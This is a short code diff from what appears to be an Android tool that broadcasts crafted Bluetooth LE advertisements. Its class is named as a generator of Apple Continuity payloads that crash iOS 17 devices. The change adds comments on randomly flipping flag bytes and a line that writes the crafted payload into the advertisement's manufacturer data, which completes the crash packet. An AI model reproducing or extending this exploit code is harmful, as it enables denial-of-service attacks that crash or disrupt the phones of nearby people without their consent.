@@ -57,13 +57,16 @@ class ContinuityIos17CrashAdvertisementSetGenerator: IAdvertisementSetGenerator 
                     val action = payload[3]
                     var flag = payload[2]
 
+                    // Change flag from time to time
                     if((StringHelpers.byteToHexString(action) == "20") && Random.nextBoolean()){
                         flag = StringHelpers.decodeHex("BF")[0]
                     }
 
+                    // Change flag from time to time
                     if((StringHelpers.byteToHexString(action) == "09") && Random.nextBoolean()){
                         flag = StringHelpers.decodeHex("40")[0]
                     }
+
                     payload[2] = flag
 
                     // randomize auth tag
@@ -78,6 +81,7 @@ class ContinuityIos17CrashAdvertisementSetGenerator: IAdvertisementSetGenerator 
                         payload[12] = Random.nextBytes(1)[0]
                     }
 
+                    advertisementSet.advertiseData.manufacturerData[0].manufacturerSpecificData = payload
                 }
             }
 
